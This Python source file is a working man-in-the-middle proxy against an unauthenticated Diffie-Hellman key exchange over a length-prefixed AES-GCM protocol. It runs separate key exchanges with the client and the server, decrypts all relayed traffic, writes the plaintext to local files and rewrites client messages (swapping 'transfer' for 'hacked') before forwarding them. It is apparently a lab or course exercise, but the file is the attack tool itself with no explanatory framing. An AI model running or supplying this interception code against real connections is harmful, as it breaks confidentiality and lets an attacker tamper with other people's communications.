#!/usr/bin/env python3

import argparse
import sys
import select
import time
import socket
import threading
import struct
import os
import hashlib
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes


g = 2
p = int(
    "00cc81ea8157352a9e9a318aac4e33ffba80fc8da3373fb44895109e4c3ff6cedcc55c02228fccbd"
    "551a504feb4346d2aef47053311ceaba95f6c540b967b9409e9f0502e598cfc71327c5a455e2e807"
    "bede1e0b7d23fbea054b951ca964eaecae7ba842ba1fc6818c453bf19eb9c5c86e723e69a210d4b7"
    "2561cab97b3fb3060b",
    16
)

param_numbers = dh.DHParameterNumbers(p, g)
dh_parameters = param_numbers.parameters()

def derive_key(shared_key: bytes) -> bytes:
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'dh-session-key'
    )
    return hkdf.derive(shared_key)

def int_to_padded_decimal_string(value: int, length: int = 384) -> str:
    dec_str = str(value)
    return dec_str.zfill(length)

def padded_decimal_string_to_int(padded_str: str) -> int:
    return int(padded_str, 10)

def receive_public_key(sock) -> int:
    key_bytes = b''
    expected_len = 384
    print("[DEBUG] Receiving public key (expecting 384 bytes)...")
    while len(key_bytes) < expected_len:
        chunk = sock.recv(expected_len - len(key_bytes))
        if not chunk:
            raise ConnectionError("Connection closed during key reception")
        key_bytes += chunk
        print(f"[DEBUG] Received {len(chunk)} bytes, total: {len(key_bytes)}")
    print("[DEBUG] Full key received.")
    return int(key_bytes.decode('utf-8'))

def send_public_key(sock, pub_int):
    pub_str = int_to_padded_decimal_string(pub_int)
    sock.sendall(pub_str.encode('utf-8'))

def decrypt_data(segment, session_key):
    if len(segment) < 16:
        raise ValueError("Segment is too short")

    nonce = segment[:16]
    ciphertext = segment[16:]
    

    aesgcm = AESGCM(session_key)
    return aesgcm.decrypt(nonce, ciphertext, None)

def encrypt_data(plaintext, session_key):
    nonce = os.urandom(16)
    aesgcm = AESGCM(session_key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    length = 16 + len(ciphertext)
    length_bytes = struct.pack('>H', length)
    return length_bytes + nonce + ciphertext

def relay_loop(client_sock, server_sock, key_c, key_s, max_idle=10, max_messages=100):
    print("[DEBUG] Entered relay_loop")
    sockets = [client_sock, server_sock]
    last_activity = time.time()
    messages_forwarded = 0

    client_sock.setblocking(False)
    server_sock.setblocking(False)

    while True:
        readable, _, exceptional = select.select(sockets, [], sockets, 0.1)

        if exceptional:
            print("[!] Exception in sockets, closing relay loop.")
            break

        if not readable:
            if time.time() - last_activity > max_idle:
                print(f"[*] No activity for {max_idle} seconds, closing relay loop.")
                break
            continue  

        for sock in readable:
            try:
                length_bytes = sock.recv(2)
                if len(length_bytes) == 0:
                    print(f"[!] Socket closed by {'client' if sock == client_sock else 'server'} (normal EOF). Ending relay loop.")
                    return
                elif len(length_bytes) < 2:
                    print(f"[!] Partial length header received from {'client' if sock == client_sock else 'server'}. Closing connection.")
                    return

                length = struct.unpack('>H', length_bytes)[0]
                print(f"[PROXY] Received length header: {length} bytes from {'client' if sock == client_sock else 'server'}")

                segment = b''
                while len(segment) < length:
                    chunk = sock.recv(length - len(segment))
                    if not chunk:
                        print("[!] Connection closed during segment read")
                        return
                    segment += chunk

                print(f"[PROXY] Received full segment ({len(segment)} bytes)")
                last_activity = time.time() 
                messages_forwarded += 1

                if sock == client_sock:
                    print("[PROXY] -- Data from client")
                    try:
                        plaintext = decrypt_data(segment, key_c)
                    except Exception as e:
                        print(f"[!] Decryption failed from client: {e}")
                        continue

                    modified = plaintext.replace(b"transfer", b"hacked")
                    try:
                        print("[MITM] Intercepted from client:", plaintext.decode('utf-8'))
                    except UnicodeDecodeError:
                        print("[MITM] Intercepted from client (raw):", plaintext)

                    print(f"[DEBUG] Intercepted plaintext from client ({len(plaintext)} bytes): {plaintext[:100]}...")
                    with open("intercepted_by_proxy.txt", "ab") as f:
                        f.write(plaintext)
                    print("[DEBUG] Write to intercepted_by_proxy.txt done")

                    new_segment = encrypt_data(modified, key_s)
                    server_sock.sendall(new_segment)
                    print("[PROXY] Decrypted and forwarded message from client to server. \n")

                else:
                    print("[PROXY] -- Data from server")
                    try:
                        plaintext = decrypt_data(segment, key_s)
                    except Exception as e:
                        print(f"[!] Decryption failed from server!: {e}")
                        continue

                    with open("intercepted_from_server.txt", "ab") as f:
                        f.write(plaintext + b"\n")

                    try:
                        print("[MITM] Intercepted from server:", plaintext.decode('utf-8'))
                    except UnicodeDecodeError:
                        print("[MITM] Intercepted from server (raw):", plaintext)

                    new_segment = encrypt_data(plaintext, key_c)
                    client_sock.sendall(new_segment)
                    print("[PROXY] Decrypted and forwarded message from server to client. \n")


            except Exception as e:
                print(f"[!] Relay error: {e}")
                return

def handle_client(client_sock, server_host, server_port):
    MAX_EXECUTION_TIME = 60
    start_time = time.time()
    try:
        print("[DEBUG] Starting handle_client...")
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((server_host, server_port))
        print("[*] Connected to real server!")

        server_pub_val = receive_public_key(server_sock)
        print(f"[PROXY] Received server public key!: {server_pub_val}")

        priv_c = dh_parameters.generate_private_key()
        pub_c = priv_c.public_key().public_numbers().y

        send_public_key(client_sock, pub_c)
        print("[PROXY] Sent proxy public key to client!")

        print("[DEBUG] Waiting for client's DH public key...")
        client_sock.settimeout(30)
        try:
            client_pub_val = receive_public_key(client_sock)
        except socket.timeout:
            print("[ERROR] Timed out waiting for client's public key.")
            return
        finally:
            client_sock.settimeout(None)
        print(f"[PROXY] Received client public key!: {client_pub_val}")

        priv_s = dh_parameters.generate_private_key()
        pub_s = priv_s.public_key().public_numbers().y

        send_public_key(server_sock, pub_s)
        print("[PROXY] Sent proxy public key to server!")

        client_public_key = dh.DHPublicNumbers(client_pub_val, param_numbers).public_key()
        key_c = derive_key(priv_c.exchange(client_public_key))
        print(f"[PROXY] Session key with client: {key_c.hex()}")

        server_public_key = dh.DHPublicNumbers(server_pub_val, param_numbers).public_key()
        key_s = derive_key(priv_s.exchange(server_public_key))
        print(f"[PROXY] Session key with server: {key_s.hex()}")

        print("[*] Entering bidirectional relay loop...")

        client_sock.settimeout(10)
        server_sock.settimeout(10)
        
        relay_loop(client_sock, server_sock, key_c, key_s, max_idle=10)
            

        client_sock.close()
        server_sock.close()
        print("[*] Closed connections.")

    except Exception as e:
        print(f"[!] Error: {e}")

        try:
            client_sock.close()
        except Exception:
            pass
        try:
            server_sock.close()
        except Exception:
            pass


def start_proxy(listen_port, server_host, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', listen_port))
        server.listen(5)
        print(f"[+] dh-proxy listening on port {listen_port}")

        while True:
            client_sock, addr = server.accept()
            print(f"[+] Accepted connection from {addr}")
            threading.Thread(
                target=handle_client,
                args=(client_sock, server_host, server_port),
                daemon=True
            ).start()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Diffie-Hellman MITM Proxy")
    parser.add_argument('-l', '--listen', type=int, required=True, help="Port to listen on")
    parser.add_argument('server_ip', type=str, help="Real server IP address")
    parser.add_argument('server_port', type=int, help="Real server port")

    args = parser.parse_args()

    try:
        start_proxy(listen_port=args.listen, server_host=args.server_ip, server_port=args.server_port)
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)

    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
